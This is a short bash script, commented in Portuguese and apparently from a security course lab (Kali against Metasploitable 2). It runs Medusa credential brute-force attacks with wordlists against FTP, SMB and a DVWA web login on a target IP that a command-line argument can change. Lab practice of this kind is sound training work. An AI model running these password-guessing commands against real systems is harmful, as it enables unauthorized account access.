#!/usr/bin/env bash
# ==============================================================================
# Script de automação/exemplo de testes de auditoria com Medusa
# Ambiente de Laboratório Controlado (Kali Linux -> Metasploitable 2)
# ==============================================================================

TARGET_IP="${1:-192.168.56.101}"
USER_LIST="../wordlists/users.txt"
PASS_LIST="../wordlists/passwords.txt"

echo "[*] Alvo configurado: $TARGET_IP"
echo "[*] Iniciando auditoria em ambiente de testes..."

# 1. Teste de Força Bruta em FTP (Porta 21)
echo -e "\n[*] Executando Medusa no servico FTP..."
medusa -h "$TARGET_IP" -U "$USER_LIST" -P "$PASS_LIST" -M ftp -t 4 -f

# 2. Teste de Força Bruta em SMB (Porta 445/139)
echo -e "\n[*] Executando Medusa no servico SMB..."
medusa -h "$TARGET_IP" -U "$USER_LIST" -P "$PASS_LIST" -M smbnt -t 4 -f

# 3. Teste em Formulário Web HTTP (Exemplo DVWA ou autenticacao basica)
echo -e "\n[*] Executando Medusa no servico HTTP (Basic Auth / Web Form)..."
medusa -h "$TARGET_IP" -U "$USER_LIST" -P "$PASS_LIST" -M http -m DIR:/dvwa/login.php -t 2 -f

echo -e "\n[+] Testes concluidos."
